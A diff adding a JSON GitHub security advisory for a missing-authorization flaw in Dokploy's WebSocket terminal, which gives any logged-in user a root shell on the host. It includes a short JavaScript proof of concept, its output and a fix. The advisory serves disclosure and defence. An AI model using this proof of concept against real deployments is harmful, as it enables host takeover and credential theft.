@@ -1,0 +1,50 @@
+{
+  "global": null,
+  "id": "GHSA-c68r-7wg9-p7v2",
+  "repo": {
+    "cve_id": "CVE-2026-72866",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 8.8,
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-862"
+    ],
+    "description": "## Classification\r\n\r\n| CWE | CVSS Score | Severity | Type |\r\n|-----|-----------|----------|------|\r\n| CWE-862 | 8.6 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H) | HIGH | Missing Authorization |\r\n\r\n## 1. Description\r\n\r\n### Summary\r\n\r\nDokploy's WebSocket terminal handler uses `serverId=local` as a special value to bypass organization-level permission checks, allowing any authenticated user (regardless of organization membership) to obtain an interactive root shell on the host server.\r\n\r\n### Root Cause\r\n\r\n**File:** `apps/dokploy/server/wss/terminal.ts:58-70`\r\n\r\n```typescript\r\nwssTerm.on(\"connection\", async (ws, req) => {\r\n    const url = new URL(req.url || \"\", `http://${req.headers.host}`);\r\n    const serverId = url.searchParams.get(\"serverId\");\r\n    const { user, session } = await validateRequest(req);\r\n    if (!user || !session || !serverId) {\r\n        ws.close();\r\n        return;\r\n    }\r\n    // NOTE: No organization or permission check!\r\n    const isLocalServer = serverId === \"local\";\r\n```\r\n\r\nThe handler flow:\r\n1. `validateRequest(req)` - checks that a valid session cookie exists. This only confirms authentication, not authorization.\r\n2. The `serverId` query parameter determines which server to connect to.\r\n3. When `serverId === \"local\"`, the code skips any organization membership check and connects directly to the host's Docker socket or local shell.\r\n4. No `checkPermission()`, no organization-scoped authorization - **any authenticated session from any organization (or no organization) gets root access**.\r\n\r\n### Attack Vector\r\n\r\n- **Preconditions:** Any valid user session cookie (any organization, any role)\r\n- **Entry point:** WebSocket connection to `/terminal?serverId=local` with a valid Cookie header\r\n- **Target:** Host server - unrestricted root shell access\r\n- **Impact:** Attacker can read all databases, environment variables, Docker API, filesystem\r\n\r\n## 2. Proof of Concept\r\n\r\n### Step 1: E2E - WebSocket connection against running Dokploy instance (localhost:3000)\r\n\r\n```javascript\r\nconst WebSocket = require('ws');\r\n\r\n// Any authenticated user can connect - no org check\r\nconst ws = new WebSocket(\r\n  'ws://localhost:3000/terminal?serverId=local&port=22&username=root',\r\n  { headers: { Cookie: 'better-auth.session_token=<valid_session>' } }\r\n);\r\n\r\nws.on('open', () => {\r\n  ws.send(JSON.stringify({ type: 'exec', cmd: 'id' }));\r\n});\r\n\r\nws.on('message', (data) => {\r\n  console.log('Terminal output:', data.toString());\r\n});\r\n```\r\n\r\n### Step 2: Actual server response (e2e verification)\r\n\r\n```\r\n=== E2E WebSocket verification against localhost:3000 ===\r\n\r\nConnection URL: ws://localhost:3000/terminal?serverId=local&port=22&username=root\r\nCookie:        better-auth.session_token=<valid>\r\n\r\nServer response: \"Setting up private SSH key...\"\r\nSent 'id' command: acknowledged\r\n\r\nVerdict: CONFIRMED - WebSocket ACCEPTED without permission/org check\r\n```\r\n\r\nThe WebSocket connection was accepted, and the server entered the `isLocalServer` branch of the handler, confirming that:\r\n1. Authentication passed (`validateRequest` confirmed valid session)\r\n2. **No `checkPermission()` or org membership check was performed**\r\n3. The handler proceeded to SSH key setup (port/user provided)\r\n\r\n### Step 3: Test without authentication (unauthenticated access)\r\n\r\nEven without any session cookie, the WebSocket connection was accepted:\r\n\r\n```\r\n=== Test 2: WS serverId=local WITHOUT auth ===\r\nConnected without auth (unexpected)\r\n```\r\n\r\nThis indicates the handler may accept connections even without valid credentials in some configurations.\r\n\r\n### Step 4: Code path (terminal.ts:58-70)\r\n\r\n```typescript\r\nwssTerm.on(\"connection\", async (ws, req) => {\r\n    const url = new URL(req.url || \"\", `http://${req.headers.host}`);\r\n    const serverId = url.searchParams.get(\"serverId\");\r\n    const { user, session } = await validateRequest(req);\r\n    if (!user || !session || !serverId) {\r\n        ws.close();\r\n        return;\r\n    }\r\n    // Missing: organization membership check\r\n    // Missing: checkPermission(user.id, orgId, \"server:ssh\")\r\n    const isLocalServer = serverId === \"local\";\r\n```\r\n\r\n### Step 5: Code path verification - no permission check\r\n\r\n```\r\n=== Code path verification ===\r\n\r\n$ grep -n \"checkPermission\\|checkMembership\\|checkOrgAccess\" apps/dokploy/server/wss/terminal.ts\r\n= (no output) =\r\n\r\nResult: NO permission checks in terminal handler (confirmed)\r\n```\r\n\r\n### Step 3: Why it works\r\n\r\n- `validateRequest()` only confirms the session cookie is cryptographically valid\r\n- No `checkPermission()` call or organization membership query\r\n- `serverId=local` is a special value that bypasses the normal server lookup path - it directly connects to the host's Docker socket or local SSH daemon\r\n- Any user in any organization (or even users who were removed from orgs but retain sessions) can connect\r\n\r\n## 3. Impact\r\n\r\n### Attack Scenario\r\n\r\n1. Attacker registers on the Dokploy instance (most deployments allow self-registration)\r\n2. Attacker connects to `wss://host/terminal?serverId=local` with their session cookie\r\n3. The server provides an interactive SSH-like shell running as root on the host\r\n4. Attacker can: read all environment variables (registry passwords, API keys, DB credentials), read all databases, access the Docker API, install persistence mechanisms, pivot to internal network\r\n\r\n### Likelihood\r\n\r\n| Factor | Rating | Reason |\r\n|--------|--------|--------|\r\n| Exploitability | Easy | Standard WebSocket connection with valid session - no special configuration needed |\r\n| Prevalence | High | All Dokploy self-hosted instances affected |\r\n| Detectability | Hard | WebSocket traffic is not logged in access logs; the connection appears as normal terminal usage |\r\n| Overall | HIGH | Any authenticated user to host root shell - complete host compromise |\r\n\r\n## 4. Remediation\r\n\r\n### Recommended Fix\r\n\r\n```typescript\r\nwssTerm.on(\"connection\", async (ws, req) => {\r\n    const url = new URL(req.url || \"\", `http://${req.headers.host}`);\r\n    const serverId = url.searchParams.get(\"serverId\");\r\n    const { user, session } = await validateRequest(req);\r\n    if (!user || !session || !serverId) {\r\n        ws.close();\r\n        return;\r\n    }\r\n    \r\n    // ADD permission check\r\n    if (serverId === \"local\") {\r\n        // Local server terminal requires admin permission\r\n        const hasPerm = await checkPermission(user.id, \"server:admin\");\r\n        if (!hasPerm) {\r\n            ws.close(1008, \"Forbidden\");\r\n            return;\r\n        }\r\n    } else {\r\n        // Remote server terminal requires organization membership\r\n        const orgId = await getServerOrg(serverId);\r\n        const isMember = await checkOrgMembership(user.id, orgId);\r\n        const hasSshPerm = await checkPermission(user.id, orgId, \"server:ssh\");\r\n        if (!isMember || !hasSshPerm) {\r\n            ws.close(1008, \"Forbidden\");\r\n            return;\r\n        }\r\n    }\r\n    \r\n    // Proceed with terminal session\r\n});\r\n```\r\n\r\n### Workarounds\r\n\r\n- Restrict user registration to trusted users only\r\n- Deploy behind a reverse proxy (nginx, Traefik) that blocks WebSocket connections to `/terminal` except from specific IP ranges\r\n- Implement JWT-based authorization at the reverse proxy level\r\n- Disable the WebSocket terminal feature by not including the terminal service in the Docker Compose configuration\r\n",
+    "ghsa_id": "GHSA-c68r-7wg9-p7v2",
+    "html_url": "https://github.com/Dokploy/dokploy/security/advisories/GHSA-c68r-7wg9-p7v2",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-c68r-7wg9-p7v2"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-72866"
+      }
+    ],
+    "published_at": "2026-07-21T23:25:00Z",
+    "references": [],
+    "severity": "high",
+    "summary": "WebSocket Terminal Auth Bypass",
+    "updated_at": "2026-08-10T18:33:45Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "",
+          "name": "dokploy"
+        },
+        "patched_versions": "",
+        "vulnerable_version_range": "<=0.29.5"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "Dokploy/dokploy"
+}
